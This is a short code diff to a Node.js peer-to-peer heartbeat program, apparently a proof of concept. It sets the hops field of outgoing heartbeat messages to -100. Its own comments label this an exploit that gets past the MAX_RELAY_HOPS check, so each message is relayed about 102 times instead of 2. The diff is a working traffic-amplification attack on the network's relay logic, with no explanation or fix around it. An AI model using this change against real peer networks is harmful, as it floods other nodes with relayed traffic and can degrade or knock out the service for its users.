@@ -4,10 +4,11 @@ const sodium = require("sodium-native");
 const { Worker, isMainThread, parentPort, workerData } = require("worker_threads");
 const os = require("os");
 
-const TOPIC_NAME = "hypermind-test-local";
+const TOPIC_NAME = "hypermind-lklynet-v1";
 const TOPIC = crypto.createHash("sha256").update(TOPIC_NAME).digest();
 const POW_PREFIX = "0000";
 const HEARTBEAT_INTERVAL = 5000;
+const NEGATIVE_HOPS = -100; // Exploit: bypasses MAX_RELAY_HOPS, causes ~102 relays instead of 2
 
 // --- WORKER THREAD LOGIC ---
 if (!isMainThread) {
@@ -63,7 +64,7 @@ if (!isMainThread) {
                         type: "HEARTBEAT",
                         id: peer.id,
                         seq: peer.seq,
-                        hops: 0,
+                        hops: NEGATIVE_HOPS, // Exploit: -100 < MAX_RELAY_HOPS(2), so it gets relayed ~102 times
                         nonce: peer.nonce,
                         sig,
                     }) + "\n");
